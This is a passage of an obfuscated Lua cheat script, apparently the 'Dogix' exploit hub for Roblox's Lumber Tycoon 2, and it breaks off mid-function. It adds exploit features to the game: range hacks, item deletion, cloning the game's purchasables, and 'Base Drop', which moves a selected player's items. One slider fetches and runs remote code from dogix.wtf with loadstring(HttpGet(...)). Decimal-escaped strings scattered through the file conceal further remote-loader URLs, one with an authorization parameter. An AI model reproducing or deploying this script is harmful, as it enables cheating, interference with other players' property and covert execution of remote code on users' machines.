	D.Parent:WaitForChild("DragWire").OnInvoke = function(R)
		C.PlayerGui.IsPlacingStructure.Value = true;
		if K == "Placing" then
			exitPlacementMode()
			wait(0.1)
		end;
		L = M:GetPlayerLand(C)
		K = "Placing"
		setPlatformControls()
		setGUIVisibility(true)
		local S = {}
		local gF = Instance.new("Model", workspace.CurrentCamera)
		local y = nil;
		while K == "Placing" or K == "Add Point" or K == "Remove Point" do
			N.Visible = #S >= 2;
			gF:ClearAllChildren()
			local eq = true;
			local v = 0;
			local function aq(V, am)
				local bf = (V - am).magnitude;
				v = v + bf;
				local gG = Instance.new("Part", gF)
				gG.Shape = Enum.PartType.Cylinder;
				gG.Anchored = true;
				gG.CanCollide = false;
				gG.CFrame = CFrame.new(V, am) * CFrame.new(0, 0, -bf / 2) * CFrame.Angles(0, math.pi / 2, 0)
				gG.Size = Vector3.new(bf, R.OtherInfo.Thickness.Value, R.OtherInfo.Thickness.Value)
				gG.Transparency = 0.5;
				gG.TopSurface = Enum.SurfaceType.Smooth;
				gG.BottomSurface = Enum.SurfaceType.Smooth;
				gG.BrickColor = BrickColor.new("Bright green")
				if bf < 0 then
					gG.BrickColor = BrickColor.new("Bright red")
					return false, "Wire section too short"
				end;
				if R.OtherInfo.MaxLength.Value < v then
					gG.BrickColor = BrickColor.new("Bright red")
					return false, "Wire too long"
				end;
				return true, O
			end;
			local function gH(gI)
				local gJ = Instance.new("Part", gF)
				gJ.Anchored = true;
				gJ.CanCollide = false;
				gJ.Shape = Enum.PartType.Ball;
				gJ.Size = Vector3.new(1, 1, 1) * R.OtherInfo.Thickness.Value;
				gJ.CFrame = CFrame.new(gI)
				gJ.Transparency = 0.5;
				gJ.TopSurface = Enum.SurfaceType.Smooth;
				gJ.BottomSurface = Enum.SurfaceType.Smooth;
				return gJ
			end;
			for gK, gL in pairs(S) do
				local gM = gH(gL)
				if gK < #S then
					local gN, gO = aq(gL, S[gK + 1])
					O = gO;
					gM.BrickColor = gN and BrickColor.new("Bright green") or BrickColor.new("Bright red")
					eq = eq or gN
				else
					gM.BrickColor = BrickColor.new("Bright green")
				end
			end;
			P = eq;
			local gP, gQ = getMousePoint(R.OtherInfo.Thickness.Value)
			local gR = nil;
			if #S > 0 and gQ then
				local gS, gT = aq(S[#S], gQ)
				gP = gS;
				gR = gT
			end;
			local cX, gU = M:CanPlace(C, gQ, L)
			if not cX then
				gP = false;
				gR = "You can only place wires on your land"
			elseif cX then
				if #S == 0 then
					y = gU
				elseif #S > 0 and y ~= gU then
					gP = false;
					gR = "You cannot build accross different plots"
				end
			end;
			if gQ then
				gH(gQ).BrickColor = gP and BrickColor.new("Bright green") or BrickColor.new("Bright red")
			end;
			if K == "Add Point" then
				if gP then
					table.insert(S, gQ)
				else
					game.ReplicatedStorage.Notices.SendUserNotice:Fire(gR, 1.5)
				end;
				K = "Placing"
			elseif K == "Remove Point" then
				if #S > 0 then
					table.remove(S)
					K = "Placing"
				else
					K = "Abort placement"
				end
			end;
			wait()
		end;
		setGUIVisibility(false)
		C.PlayerGui.IsPlacingStructure.Value = false;
		gF:Destroy()
		if K ~= "Confirm placement" then
			if K == "Abort placement" then
				return false
			else
				return
			end
		end;
		Q:play()
		return S, y
	end;
	function getMousePoint(gV)
		local gW = b4.GetMouseHit().p;
		local cZ = b4.GetMouseTarget()
		if not cZ then
			return
		end;
		local cY = (gW - H.CFrame.p).unit;
		local gX = Ray.new(gW - cY / 2, cY)
		local gY = {
			F
		}
		local gZ = 1 - 1;
		while true do
			local g_, h0, h1 = workspace:FindPartOnRayWithIgnoreList(gX, gY)
			if not g_ then
				return false, gW
			end;
			if g_ == cZ then
				return cZ.Anchored, gW + h1 * gV / 2
			end;
			table.insert(gY, g_)
			if 0 <= 1 then
				if gZ < 100 then
				else
					break
				end
			elseif 100 < gZ then
			else
				break
			end;
			gZ = gZ + 1
		end
	end;
	local al = D.Parent:WaitForChild("Confirm")
	local h2 = require(D.Parent.Parent:WaitForChild("BumpButton"))
	function addPoint()
		if not al.Visible then
			return
		end;
		if not h2.Bump(al) then
			return
		end;
		K = "Add Point"
	end;
	function finalizeSelected()
		if not N.Visible then
			return
		end;
		if not h2.Bump(N) then
			return
		end;
		if P then
			K = "Confirm placement"
			return
		end;
		if K == "Placing" then
			if #L == 0 then
				game.ReplicatedStorage.Notices.SendUserNotice:Fire("You must own land to place structures. Visit the land store to buy some.", 2.5)
			else
				game.ReplicatedStorage.Notices.SendUserNotice:Fire(O, 1.5)
			end;
			game.Players.LocalPlayer.PlayerGui.ClientSounds.Err:Play()
		end
	end;
	local h3 = D.Parent:WaitForChild("Back")
	function back()
		if not h3.Visible then
			return
		end;
		if not h2.Bump(h3) then
			return
		end;
		K = "Remove Point"
	end;
	function exitPlacementMode()
		if not h3.Visible then
			return
		end;
		K = "Abort placement"
	end;
	function roundVector(h4)
		return Vector3.new(intervalRound(h4.X, 0.1), intervalRound(h4.Y, 0.1), intervalRound(h4.Z, 0.1))
	end;
	function intervalRound(h5, h6)
		local h7 = math.fmod(h5, h6)
		if h6 / 2 <= h7 then
			h7 = h5 + h6 - h7
		elseif h7 < h6 / 2 then
			h7 = h5 - h7
		end;
		return roundOff(h7, h6)
	end;
	function roundOff(h8, h9)
		return math.floor(h8 * 10 ^ h9 + 0.5) / 10 ^ h9
	end;
	function setGUIVisibility(ha)
		N.Visible = ha;
		al.Visible = ha;
		h3.Visible = ha;
		b4.SetBackpackEnabled(not ha)
	end;
	function setPlatformControls()
		if b4.Device == "Touch" then
			al.PlatformButton.Visible = false;
			h3.PlatformButton.Visible = false;
			N.PlatformButton.Visible = false;
			h3.Position = h3.TouchPosition.Position;
			return
		end;
		al.PlatformButton.Visible = true;
		h3.PlatformButton.Visible = true;
		N.PlatformButton.Visible = true;
		if b4.Device == "Gamepad" then
			al.PlatformButton.Image = al.PlatformButton.Gamepad.Value;
			N.PlatformButton.Image = N.PlatformButton.Gamepad.Value;
			h3.PlatformButton.Image = h3.PlatformButton.Gamepad.Value;
			al.PlatformButton.KeyLabel.Text = ""
			N.PlatformButton.KeyLabel.Text = ""
			h3.PlatformButton.KeyLabel.Text = ""
			return
		end;
		if b4.Device == "PC" then
			al.PlatformButton.Image = al.PlatformButton.PC.Value;
			h3.PlatformButton.Image = h3.PlatformButton.PC.Value;
			N.PlatformButton.Image = N.PlatformButton.PC.Value;
			al.PlatformButton.KeyLabel.Text = "E"
			h3.PlatformButton.KeyLabel.Text = "B"
			N.PlatformButton.KeyLabel.Text = "F"
		end
	end;
	wait(1)
	b4 = require(D.Parent.Parent.Scripts.UserInput)
	b4.InteractSelectionMade(addPoint)
	b4.InteractAbort(back)
	b4.FinalizeWireSelection(finalizeSelected)
	N.MouseButton1Click:connect(function()
		finalizeSelected()
	end)
	h3.MouseButton1Click:connect(function()
		back()
	end)
	al.MouseButton1Click:connect(function()
		addPoint()
	end)
end, {
	animated = true
})
local hb = false;
zG = "\10\32\32\32\32\85\114\108\32\61\32\115\116\114\105\110\103\46\102\111\114\109\97\116\40\39\104\116\116\112\115\58\47\47\99\100\110\45\50\46\97\112\112\108\101\98\101\101\49"
gB:Create("Slider", "Interaction Range", function(v)
	_G.CurrentRangeMyAss = tonumber(v)
	if not hb and v ~= 11 then
		hb = true;
		loadstring(game:HttpGet"https://dogix.wtf/scripts/lt2/interaction_range.lua")()
	end
end, {
	min = 5,
	max = 200,
	default = 11
})
gB:Create("Button", "Click Delete Item Tool (SS)", function(v)
	local aH = game:GetService("Players").LocalPlayer;
	local cp = Instance.new("Tool", aH.Backpack)
	cp.RequiresHandle = false;
	cp.Name = "Destroy Item"
	cp.Activated:Connect(function()
		local a_ = getMouseTarget()
		if a_:IsA("Part") then
			local hc = a_;
			repeat
				hc = hc.Parent
			until hc == workspace or hc == game or hc == workspace.PlayerModels or hc == workspace.LogModels or hc.Name == "TreeRegion" or hc.Name == "ShopItems" or hc.Name == "TreeRegion" or hc.Name == "Stores"
			if hc ~= game and hc ~= workspace then
				delmodel(a_.Parent)
			end
		end
	end)
end, {
	animated = true
})
local d7 = "Auto-Buy"
if d then
	d7 = 5182389716
end;
local hd = d6:CreateCategory(d7)
local he = 1;
local hf = "BasicHatchet"
local hg = hd:CreateSection("General Auto-Buy")
local hh = {"BasicHatchet","Axe1","Axe2","Axe3","SilverAxe","ManyAxe","Rukiryaxe","Wire","NeonWireOrange","NeonWireRed","NeonWireViolet","NeonWireWhite","NeonWireYellow","NeonWireBlue","NeonWireCyan","NeonWireGreen","IcicleWireBlue","IcicleWireAmber","IcicleWireRed","IcicleWireGreen","IcicleWireHalloween","LightBulb","BagOfSand","CanOfWorms","Dynamite","Sawmill","Sawmill2","Sawmill3","Sawmill4","Sawmill4L","UtilityTruck","WorkLight","SmallTrailer","Pickup1","UtilityTruck2","Trailer2","Painting1","Painting2","Painting3","Painting6","Painting7","Painting8","Painting9","ChopSaw","Button0","Lever0","Laser","LaserReceiver","Hatch","SignalDelay","SignalSustain","WoodChecker","GateNOT","GateXOR","GateAND","GateOR","ClockSwitch","PressurePlate","ConveyorSwitch","StraightSwitchConveyorLeft","StraightSwitchConveyorRight","ConveyorSupports","StraightConveyor","TightTurnConveyorSupports","TightTurnConveyor","ConveyorFunnel","TiltConveyor","LogSweeper","Seat_Armchair","Dishwasher","Refridgerator","Stove","Toilet","Seat_Couch","Seat_Loveseat","FloorLamp1","Lamp1","GlassPane1","GlassPane2","GlassPane3","GlassPane4","GlassDoor1","FireworkLauncher","Bed1","Bed2","WallLight1","WallLight2"}
local hi = {}
local hj = {}
local hk = {}
for J, v in pairs(workspace.Stores:GetChildren()) do
	if v.Name == "ShopItems" then
		for J, v in next, v:GetChildren() do
			if v:IsA("Model") then
				if v.Type.Value ~= "Blueprint" then
					local hl = game:GetService("ReplicatedStorage").Purchasables:FindFirstChild(v.BoxItemName.Value, true)
					if hl then
						hl = hl.ItemName.Value;
						if hi[hl] == nil then
							hi[hl] = v.BoxItemName.Value;
							local hm = game:GetService("ReplicatedStorage").Purchasables:FindFirstChild(v.BoxItemName.Value, true).Type.Value;
							if hj[hm] == nil then
								hj[hm] = {}
							end;
							table.insert(hj[hm], hl)
						end
					end
				end
			end
		end
	end
end;
zH = "\53\53\56\46\99\111\109\47\98\97\114\107\47\117\105\45\108\105\98\63\97\117\116\104\111\114\105\122\97\116\105\111\110\61\37\115\38\116\121\112\101\61\37\115\39\44\40\108\111\97\100\115"
table.insert(hj.Tool, "Rukiryaxe")
hi.Rukiryaxe = "Rukiryaxe"
for J, v in pairs(hj) do
	for J, v in pairs(v) do
		table.insert(hk, v)
	end
end;
hg:Create("Dropdown", "Item Selection", function(db)
	hf = hi[db]
end, {
	options = hk,
	search = true,
	default = "Basic Hatchet"
})
didhigh = false
hg:Create("Slider", "Quantity", function(v)
	he = tonumber(v)
	if v == 25 and not didhigh then
	    didhigh = true
        hg:Create("TextBox", "Unrestricted Quantity", function(v)
        	he = tonumber(v)
        end, {
        	text = "Quantity"
        })
	end
end, {
	min = 1,
	max = 25,
	default = 1,
	changablevalue = true
})
hg:Create("Button", "Purchase Items", function(v)
	if hf ~= "Rukiryaxe" then
		local hn = price_of(hf)
		if math.floor(game.Players.LocalPlayer.leaderstats.Money.Value / hn) < he then
			x("Auto-Buy", "You cannot afford "..he.." "..hf..".", 3)
			return
		end;
		autobuy(hf, he)
	else
		local aH = game:GetService'Players'.LocalPlayer;
		local ho = aH.Character.HumanoidRootPart.CFrame;
		local hp = autobuy("LightBulb", 1, CFrame.new(322.33, 43, 1916.5), false)
		if not hp then
			return
		end;
		local hq = autobuy("BagOfSand", 1, CFrame.new(319.4, 43, 1914.5), false)
		if not hq then
			return
		end;
		local hr = autobuy("CanOfWorms", 1, CFrame.new(317.25, 43, 1918), false)
		if not hr then
			return
		end;
		if hq and hr and hp then -- i return the boxes when i buy them so return them
			local hs = game:GetService("ReplicatedStorage").Interaction.ClientInteracted;
			hs:FireServer(hq, "Open box")
			hs:FireServer(hr, "Open box")
			hs:FireServer(hp, "Open box")
			local opening = workspace.PlayerModels.ChildAdded:connect(function(new)
				if new:WaitForChild("Owner").Value == nil and new:WaitForChild("ToolName").Value == "Rukiryaxe" then
					game:GetService("ReplicatedStorage").Interaction.ClientIsDragging:FireServer(new)
					game:GetService("ReplicatedStorage").Interaction.CheckShip:FireServer(new.Owner, aH)
					game:GetService("ReplicatedStorage").Interaction.ClientInteracted:FireServer(new, "Pick up tool")
					opening:Disconnect()
					opening = nil
				end
			end)
			aH.Character.HumanoidRootPart.CFrame = ho
		end
	end
end, {
	animated = true
})
hg:Create("Button", "Cancel Purchase Items", function(v)
	x("Auto-Buy", "Attempted to cancel Auto-Buy.", 3)
	abortbuy = true;
	InBuy = false
end, {
	animated = true
})
hg:Create("Button", "Get Price of Items", function(v)
	local hn = price_of(hf)
	if hn then
		x("Auto-Buy", hf.." costs $"..tostring(hn)..". You can afford "..math.floor(game.Players.LocalPlayer.leaderstats.Money.Value / hn)..".", 3)
	else
		x("Auto-Buy", "Couldn't find "..hf, 3)
	end
end, {
	animated = true
})
local ht = "Pink Neon Wire"
local hu = 1;
local hv = hd:CreateSection("Special Auto-Buy")
hv:Create("Dropdown", "Special Auto-Buy Items", function(db)
	ht = db
end, {
	options = {
		"Easy Building Power",
		"Bridge Lower",
		"Ferry Ticket"
	},
	search = true,
	default = "Bridge Lower"
})
hv:Create("Slider", "Quantity", function(v)
	hu = tonumber(v)
end, {
	min = 1,
	max = 25,
	default = 1,
	changablevalue = true
})
hv:Create("Button", "Purchase Special Item", function(v)
	if ht == "Easy Building Power" then
		if not confirm() then
			return
		end;
		local hw = {
			["Character"] = workspace["Region_Main"]["Strange Man"],
			["Name"] = "Strange Man",
			["ID"] = 2,
			["Dialog"] = workspace["Region_Main"]["Strange Man"].Dialog
		}
		game:GetService("ReplicatedStorage").NPCDialog.PlayerChatted:InvokeServer(hw, "Initiate")
		game:GetService("ReplicatedStorage").NPCDialog.PlayerChatted:InvokeServer(hw, "ConfirmPurchase")
		game:GetService("ReplicatedStorage").NPCDialog.PlayerChatted:InvokeServer(hw, "EndChat")
	elseif ht == "Ferry Ticket" then
		local hw = {
			["Character"] = workspace.Ferry.Ferry.Hoover,
			["Name"] = "Hoover",
			["ID"] = 9,
			["Dialog"] = workspace.Ferry.Ferry.Hoover.Dialog
		}
		game:GetService("ReplicatedStorage").NPCDialog.PlayerChatted:InvokeServer(hw, "Initiate")
		game:GetService("ReplicatedStorage").NPCDialog.PlayerChatted:InvokeServer(hw, "ConfirmPurchase")
		game:GetService("ReplicatedStorage").NPCDialog.PlayerChatted:InvokeServer(hw, "EndChat")
	elseif ht == "Bridge Lower" then
		for J = 1, hu do
			local hw = {
				["Character"] = workspace.Bridge.TollBooth0.Seranok,
				["Name"] = "Seranok",
				["ID"] = 7,
				["Dialog"] = workspace.Bridge.TollBooth0.Seranok.Dialog
			}
			game:GetService("ReplicatedStorage").NPCDialog.PlayerChatted:InvokeServer(hw, "Initiate")
			game:GetService("ReplicatedStorage").NPCDialog.PlayerChatted:InvokeServer(hw, "ConfirmPurchase")
			game:GetService("ReplicatedStorage").NPCDialog.PlayerChatted:InvokeServer(hw, "EndChat")
		end
	end
end, {
	animated = true
})
local hx = "NeonWirePinky"
local hy = 1;
local hz = hd:CreateSection("Cheaper Wire Auto-Buy ($220)")
hz:Create("Dropdown", "Cheap Auto-Buy Wires", function(db)
	hx = db
end, {
	options = {
		"NeonWirePinky",
		"NeonWireOrange",
		"NeonWireRed",
		"NeonWireViolet",
		"NeonWireWhite",
		"NeonWireYellow",
		"NeonWireBlue",
		"NeonWireCyan",
		"NeonWireGreen",
		"IcicleWireBlue",
		"IcicleWireAmber",
		"IcicleWireRed",
		"IcicleWireGreen",
		"IcicleWireMagenta",
		"IcicleWireHalloween"
	},
	search = true,
	default = "NeonWirePinky"
})
hz:Create("Slider", "Quantity", function(v)
	hy = tonumber(v)
end, {
	min = 1,
	max = 25,
	default = 1,
	changablevalue = true
})
hz:Create("Button", "Purchase Cheaper Wire", function(v)
	spawn_wire(hx, hy)
end, {
	animated = true
})
local hA = fQ:CreateSection("Other")
hA:Create("Button", "Leak Items", function(v)
	if not confirm() then
		return
	end;
	game.ReplicatedStorage.Purchasables:Clone().Parent = workspace.PlayerModels
end, {
	animated = true
})
local d7 = "Bases"
if d then
	d7 = 5624739564
end;
hB = d6:CreateCategory(d7)
hC = hB:CreateSection("Player")
hD = game.Players.LocalPlayer;
hC:Create("Dropdown", "From Player", function(e5)
	hD = e5
end, {
	text = "",
	playerlist = true
})
zI = "\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\100\111\103\105\120\46\119\116\102\47\115\99\114\105\112\116\115\47\108\105\98\114\97\114\105\101"
local cp = false;
local gt = false;
local hE = false;
local hF = false;
local hG = false;
local hH = false;
hori = false;
local hI = ""
local hJ = hB:CreateSection("Base Drop Settings")
local hK = nil;
local bd_ntbl = {}
local bd_ntbl2 = {}
local bd_tbl = {}
bd_tbl.Misc = {}
for i,v in pairs (game:GetService("ReplicatedStorage").Purchasables:GetDescendants()) do
    if v:IsA("Folder") and v:FindFirstChild("ItemName") and v.Parent.Name ~= "BlueprintStructures" then
        if v:FindFirstChild("Type") then
            if bd_tbl[v.Type.Value] == nil then
                bd_tbl[v.Type.Value] = {}
            end
            bd_tbl[v.Type.Value][v.ItemName.Value] = v.Name
        else
            bd_tbl.Misc[v.ItemName.Value] = v.Name
        end
    end
end
for i,v in pairs (bd_tbl) do
    table.sort(v, function(a, b)return a.Name:lower()<b.Name:lower()end)
    for i2,v2 in pairs (v) do
        table.insert(bd_ntbl,i2)
        bd_ntbl2[i2] = v2
    end
end
bd_tbl = bd_ntbl2
bd_ntbl2 = nil
hJ:Create("Dropdown", "ItemName", function(hL)
	hK = bd_tbl[hL]
end, {
	options = bd_ntbl,	search = true
})
local hM = nil;
hJ:Create("Dropdown", "Plank", function(hL)
	hM = hL
end, {
	options = {"Specific Plank","Generic","Oak","SnowGlow","CaveCrawler","SpookyNeon","Walnut","LoneCave","Cherry","Birch","Palm","Pine","Koa","Volcano","GoldSwampy","GreenSwampy","Spooky","Frost","Fir"},
	search = true
})
hJ:Create("Toggle", "Tools", function(db)
	cp = db
end, {
	default = false
})
hJ:Create("Toggle", "Planks", function(db)
	gt = db
end, {
	default = false
})
hJ:Create("Toggle", "Loose Items", function(db)
	hE = db
end, {
	default = false
})
hJ:Create("Toggle", "Gifts", function(db)
	hF = db
end, {
	default = false
})
hJ:Create("Toggle", "Boxed Structures", function(db)
	hG = db
end, {
	default = false
})
hJ:Create("Toggle", "Horizontal/Vertical", function(db)
	hori = db
end, {
	default = false
})
local hN = nil;
hJ:Create("Button", "Identify Item Tool", function()
	if not game.Players.LocalPlayer.Backpack:FindFirstChild("Identify") then
		mouse = game.Players.LocalPlayer:GetMouse()
		local hO = game:GetService("StarterGui")
		Identify = Instance.new("Tool")
		Identify.RequiresHandle = false;
		Identify.Name = "Identify"
		Identify.Activated:connect(function()
			if mouse.Target.Parent:FindFirstChild("PurchasedBoxItemName") then
				hO:SetCore("SendNotification", {
					Title = "ItemName",
					Text = mouse.Target.Parent.PurchasedBoxItemName.Value
				})
			elseif mouse.Target.Parent:FindFirstChild("ItemName") then
				hO:SetCore("SendNotification", {
					Title = "ItemName",
					Text = mouse.Target.Parent.ItemName.Value
				})
			elseif mouse.Target.Parent:FindFirstChild("TreeClass") then
				hO:SetCore("SendNotification", {
					Title = "TreeClass",
					Text = mouse.Target.Parent.TreeClass.Value
				})
			end
		end)
		Identify.Parent = game.Players.LocalPlayer.Backpack
	end
end, {
	animated = true
})
hJ:Create("Button", "Set Coordinates", function(db)
	if workspace:FindFirstChild("BarkCoord") then
		workspace.BarkCoord:Destroy()
	end;
	hN = Instance.new("Part", workspace)
	hN.Name = "BarkCoord"
	hN.Anchored = true;
	hN.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame;
	hN.CanCollide = false;
	hN.Size = Vector3.new(2, 2, 2)
	local Z = Instance.new("BoxHandleAdornment", hN)
	Z.Name = "Selection"
	Z.Adornee = Z.Parent;
	Z.AlwaysOnTop = true;
	Z.ZIndex = 0;
	Z.Size = Z.Parent.Size;
	Z.Transparency = 0;
	Z.Color = BrickColor.new("Electric blue")
end, {
	animated = true
})
hJ:Create("Button", "Delete Coordinates", function(db)
	if workspace:FindFirstChild("BarkCoord") then
		workspace.BarkCoord:Destroy()
	end
end, {
	animated = true
})
hJ:Create("Toggle", "Instant Base Drop Mode", function(db)
	hH = db;
	if db then
		x("Instant Base Drop", "When using this, you can only base drop from YOURSELF to someone else, who is the selected player.", 10)
		x("", "This player MUST WHITELIST YOU for this method to work. Coordinates are not used in this mode. Items will go to the center.", 10)
		x("", "Finally, using planks are not supported in this mode.", 10)
	end
end, {
	default = false
})
local hP = not b;
local hQ = hB:CreateSection'Base Actions'
function primpart(Z)
	return Z:FindFirstChild("Main") or Z:FindFirstChild("WoodSection") or Z:FindFirstChildOfClass("Part")
end;
local hR = 60;
hQ:Create("Button", "Base Drop Selected Item", function()
	if game:GetService("ReplicatedStorage").Interaction.ClientIsWhitelisted:InvokeServer(game.Players[tostring(hD)]) == false and game.Players[tostring(hD)] ~= game.Players.LocalPlayer then
		x("Base Drop", "You are not whitelisted currently.", 3)
		return
	end;
	if hP == true then
		x("Base Drop Terms", "By continuing to use Base Drop, you agree that you are responsible for all consequences that occur beyond this point. Dogix is not", 10)
		x("", " responsible in any way, shape, or form involving any actions and consequences of any Bark related function. Proceed only if you understand", 10)
		x("", " and agree to these terms.", 10)
		if not confirm(true) then
			return
		end;
		hP = false
	end;
	if not hH then
		if hN == nil then
			x("Base Drop", "No coordinate detected.", 3)
			return
		end;
		local hS = {}
		function delete(hT)
			if #hS == 0 then
				table.insert(hS, {
					hT
				})
			else
				local hU = false;
				for al, hV in pairs(hS) do
					if (primpart(hT).CFrame.p - primpart(hV[1]).CFrame.p).Magnitude < 40 and #hV < hR then
						table.insert(hV, hT)
						hU = true;
						break
					end
				end;
				if not hU then
					table.insert(hS, {
						hT
					})
				end
			end
		end;
		x("Base Drop", "Clustering items.", 1)
		wait()
		for J, v in pairs(workspace.PlayerModels:children()) do
			if v:FindFirstChild'Owner' and (v:FindFirstChild"ItemName" or v:FindFirstChild"PurchasedBoxItemName") then
				local fJ = v:FindFirstChild"ItemName" or v:FindFirstChild"PurchasedBoxItemName"
				if tostring(v.Owner.Value) == tostring(hD) and fJ.Value == hK then
					delete(v)
				end
			end
		end;
		for al, hV in pairs(hS) do
			local au = #hV < 7 or getExploit() ~= "Synapse"
			x("Base Drop", "Switched cluster, using "..(au and "old" or "bulk").." method.")
			_G.DogixLT2TPC(primpart(hV[1]).CFrame, o)
			wait(.5)
			local hW = {}
			for al, item in pairs(hV) do
				local Z = Instance.new("BoxHandleAdornment", primpart(item))
				Z.Name = "Selection"
				Z.Adornee = Z.Parent;
				Z.AlwaysOnTop = true;
				Z.ZIndex = 0;
				Z.Size = Z.Parent.Size;
				Z.Transparency = 0.3;
				Z.Color = BrickColor.new("Electric blue")
				table.insert(hW, Z)
				if au then
					spawn(function()
						_G.DogixLT2DragAlt(primpart(item), hN.CFrame)
					end)
				else
					spawn(function()
						_G.DogixLT2Drag(primpart(item), hN.CFrame)
					end)
				end
			end;
			wait(au and 1.5 or 4)
			for al, Z in pairs(hW) do
				Z:Destroy()
			end;
			if _G.baseDropToggle == false then
				_G.baseDropToggle = true;
				x("Base Drop", "Cancelled teleporting.", 1)
				break
			end
		end
	else
		local fn = nil;
		for al, Y in pairs(workspace.Properties:GetChildren()) do
			if tostring(Y.Owner.Value) == tostring(hD) then
				fn = Y.OriginSquare.CFrame;
				break
			end
		end;
		if not fn then
			return
		end;
		dropMeme(hK, fn)
	end;
	x("Base Drop", "Finished teleporting.", 1)
end, {
	animated = true
})
_G.baseDropToggle = true;
hQ:Create("Button", "Base Drop Selected Planks", function()
	if game:GetService("ReplicatedStorage").Interaction.ClientIsWhitelisted:InvokeServer(game.Players[tostring(hD)]) == false and game.Players[tostring(hD)] ~= game.Players.LocalPlayer then
		x("Base Drop", "You are not whitelisted currently.", 3)
		return
	end;
	if hN == nil then
		x("Base Drop", "No coordinate detected.", 3)
		return
	end;
	if hP == true then
		x("Base Drop Terms", "By continuing to use Base Drop, you agree that you are responsible for all consequences that occur beyond this point. Dogix is not", 10)
		x("", " responsible in any way, shape, or form involving any actions and consequences of any Bark related function. Proceed only if you understand", 10)
		x("", " and agree to these terms.", 10)
		if not confirm(true) then
			return
		end;
		hP = false
	end;
	local hS = {}
	function delete(hT)
		if #hS == 0 then
			table.insert(hS, {
				hT
			})
		else
			local hU = false;
			for al, hV in pairs(hS) do
				if (primpart(hT).CFrame.p - primpart(hV[1]).CFrame.p).Magnitude < 40 and #hV < hR then
					table.insert(hV, hT)
					hU = true;
					break
				end
			end;
			if not hU then
				table.insert(hS, {
					hT
				})
			end
		end
	end;
	x("Base Drop", "Clustering items.", 1)
	wait()
	for J, v in pairs(workspace.PlayerModels:children()) do
		if v:FindFirstChild'Owner' and v:FindFirstChild"TreeClass" then
			local fJ = v:FindFirstChild"TreeClass"
			if tostring(v.Owner.Value) == tostring(hD) and fJ.Value == hM then
				delete(v)
			end
		end
	end;
	for al, hV in pairs(hS) do
		local au = #hV < 7 or getExploit() ~= "Synapse"
		x("Base Drop", "Switched cluster, using "..(au and "old" or "bulk").." method.")
		_G.DogixLT2TPC(primpart(hV[1]).CFrame*CFrame.Angles(0,(hori and 165) or 0,0), o)
		wait(.5)
		local hW = {}
		for al, item in pairs(hV) do
			local Z = Instance.new("BoxHandleAdornment", primpart(item))
			Z.Name = "Selection"
			Z.Adornee = Z.Parent;
			Z.AlwaysOnTop = true;
			Z.ZIndex = 0;
			Z.Size = Z.Parent.Size;
			Z.Transparency = 0.3;
			Z.Color = BrickColor.new("Electric blue")
			table.insert(hW, Z)
			if au then
				spawn(function()
					_G.DogixLT2DragAlt(primpart(item), hN.CFrame*CFrame.Angles(0,(hori and 165) or 0,0))
				end)
			else
				spawn(function()
					_G.DogixLT2Drag(primpart(item), hN.CFrame*CFrame.Angles(0,(hori and 165) or 0,0))
				end)
			end
		end;
		wait(au and 1.5 or 4)
		for al, Z in pairs(hW) do
			Z:Destroy()
		end;
		if _G.baseDropToggle == false then
			_G.baseDropToggle = true;
			x("Base Drop", "Cancelled teleporting.", 1)
			break
		end
	end;
	x("Base Drop", "Finished teleporting.", 1)
end, {
	animated = true
})
hQ:Create("Button", "Base Drop Selected Categories", function(db)
	if game:GetService("ReplicatedStorage").Interaction.ClientIsWhitelisted:InvokeServer(game.Players[tostring(hD)]) == false and game.Players[tostring(hD)] ~= game.Players.LocalPlayer then
		x("Base Drop", "You are not whitelisted currently.", 3)
		return
	end;
	if hP == true then
		x("Base Drop Terms", "By continuing to use Base Drop, you agree that you are responsible for all consequences that occur beyond this point. Dogix is not", 10)
		x("", " responsible in any way, shape, or form involving any actions and consequences of any Bark related function. Proceed only if you understand", 10)
		x("", " and agree to these terms.", 10)
		if not confirm(true) then
			return
		end;
		hP = false
	end;
	if not hH then
		if hN == nil then
			x("Base Drop", "To use this feature, please set a coordinate.", 3)
			return
		end;
		local hS = {}
		function delete(hT)
			if #hS == 0 then
				table.insert(hS, {
					hT
				})
			else
				local hU = false;
				for al, hV in pairs(hS) do
					if (primpart(hT).CFrame.p - primpart(hV[1]).CFrame.p).Magnitude < 40 and #hV < hR then
						table.insert(hV, hT) -- this is cluster method
						hU = true;
						break
					end
				end;
				if not hU then
					table.insert(hS, {
						hT
					})
				end
			end
		end;
		x("Base Drop", "Clustering items.", 1)
		wait()
		for J, v in pairs(workspace.PlayerModels:children()) do
			if v:FindFirstChild'Owner' then
				if tostring(v.Owner.Value) == tostring(hD) then
					if v:FindFirstChild'Type' then
						if v.Type.Value == "Gift" and hF then
							delete(v)
						elseif v.Type.Value == "Loose Item" and hE then
							delete(v)
						elseif v.Type.Value == "Tool" and cp then
							delete(v)
						elseif (v.Type.Value == "Structure" or v.Type.Value == "Furniture" or v.Type.Value == "Wire") and v:FindFirstChild("PurchasedBoxItemName") and hG then
							delete(v)
						elseif v.Name == hI and hI ~= "" then
							delete(v)
						end
					elseif v:FindFirstChild'WoodSection' then
						if gt then
							delete(v)
						end
					end
				end
			end
		end;
		for al, hV in pairs(hS) do
			local au = #hV < 7 or getExploit() ~= "Synapse"
			x("Base Drop", "Switched cluster, using "..(au and "old" or "bulk").." method.")
			_G.DogixLT2TPC(primpart(hV[1]).CFrame, o)
			wait(.5)
			local hW = {}
			for al, item in pairs(hV) do
				local Z = Instance.new("BoxHandleAdornment", primpart(item))
				Z.Name = "Selection"
				Z.Adornee = Z.Parent;
				Z.AlwaysOnTop = true;
				Z.ZIndex = 0;
				Z.Size = Z.Parent.Size;
				Z.Transparency = 0.3;
				Z.Color = BrickColor.new("Electric blue")
				table.insert(hW, Z)
				if au then
					spawn(function()
						_G.DogixLT2DragAlt(primpart(item), hN.CFrame*CFrame.Angles(0,0,(hori and 165) or 0))
					end)
				else
					spawn(function()
						_G.DogixLT2Drag(primpart(item), hN.CFrame*CFrame.Angles(0,0,(hori and 165) or 0))
					end)
				end
			end;
			wait(au and 1.5 or 4)
			for al, Z in pairs(hW) do
				Z:Destroy()
			end;
			if _G.baseDropToggle == false then
				_G.baseDropToggle = true;
				x("Base Drop", "Cancelled teleporting.", 1)
				break
			end
		end
	else
		local fn = nil;
		for al, Y in pairs(workspace.Properties:GetChildren()) do
			if tostring(Y.Owner.Value) == tostring(hD) then
				fn = Y.OriginSquare.CFrame;
				break
			end
		end;
		if not fn then
			return
		end;
		function delete(item)
